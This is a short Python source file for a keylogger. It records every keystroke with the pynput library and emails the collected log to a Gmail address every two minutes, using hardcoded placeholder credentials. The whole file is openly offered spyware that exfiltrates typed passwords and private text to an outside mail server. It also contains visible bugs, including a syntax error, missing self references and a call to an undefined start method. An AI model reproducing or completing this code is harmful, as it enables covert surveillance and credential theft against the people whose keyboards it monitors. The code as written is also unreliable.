#!/usr/bin/env python

# keylogger_1.py

import pynput.keyboard as pk
import threading
import smtplib

class Keylogger:
	def __init__(self, time_interval, email, password):
		self.log = "*** KEYLOGGER STARTED ***"
		self.interval = time_interval
		self.email = email
		self.password = password
		
	def update_log(self, string):
		self.log += string
	
	def process_key_press(self, key):
		try:
			current_key = str(key.char)
		except:
			if key == key.space:
				current_key = " "
			else:
				current_key = " " + str(key) + " ") 
		update_log(current_key)

	def send_mail(email, password, message):
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def report(self):
		print(self.log)
		self.send_mail(self.email, self.password, "\n\n" + self.log)
		self.log = ""
		timer = threading.Timer(self.interval, self.report)
		timer.start()

	def start_listener(self):
		keyboard_listener = pk.Listener(on_press=self.process_key_press)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()
			
keylogger_obj = Keylogger(120, "abc@gmail.com", "abcabc")
keylogger_obj.start() 
